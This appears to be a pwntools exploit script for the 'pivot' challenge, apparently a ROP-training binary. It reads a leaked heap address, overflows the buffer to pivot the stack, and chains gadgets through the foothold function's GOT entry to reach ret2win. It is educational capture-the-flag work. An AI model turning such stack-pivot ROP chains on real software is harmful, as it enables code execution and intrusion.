#!/usr/bin/python3

from pwn import *



# TODO
write_loc 	= 0x601029

# TODO
print_file 	= p64(0x400620)

target		= "./pivot"


back_junk 	= b"B" * 20


# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2






"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
	for i in range(0, len(payload), 8):
		continue
		print(binascii.hexlify(payload[i:i+8]))




io = process(target)

first_out = io.clean(0.5).decode("utf-8")

print(first_out)
stack_smash = junk + new_bp

############### Set up the pivot ##############

# pop rax
stack_smash += p64(0x04009bb)

# the RAX binary
# I need to be interacting with the binary here by parsing out the heap loc
pivot_loc = int(first_out.split("\n")[4].split()[-1], 16)
stack_smash += p64(pivot_loc)

# exchange rsp and rax
stack_smash += p64(0x04009bd)


stack_smash += back_junk


################ create the payload ####################
#Fill up the buffer and the base pointer







# call the foothold function
payload = p64(0x00400720)

# pop rax off with the value of the location of the got for the foothold func
payload += p64(0x04009bb)
payload += p64(0x601040)

# mov the value in the got into rax
payload += p64(0x4009c0)


# place the offset from foothold to ret2win in rbp
## pop rbp
payload += p64(0x004007c8)
## offset to place in it
payload += p64(0xa81-0x96a)

# add the offset to rax
payload += p64(0x04009c4)


# jump to rax
payload += p64(0x04007c1)




# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))

input("Hit enter to apptempt exploit")



print(io.clean(0.5).decode("utf-8"))

io.send(payload)
print(io.clean(0.5).decode("utf-8"))
io.send(stack_smash)

io.send(payload)
input("exploit sent hit enter to end")


print(io.clean(0.5).decode("utf-8"))


sleep(1)


f = open('./payload', 'wb')
f.write(payload)
f.close()
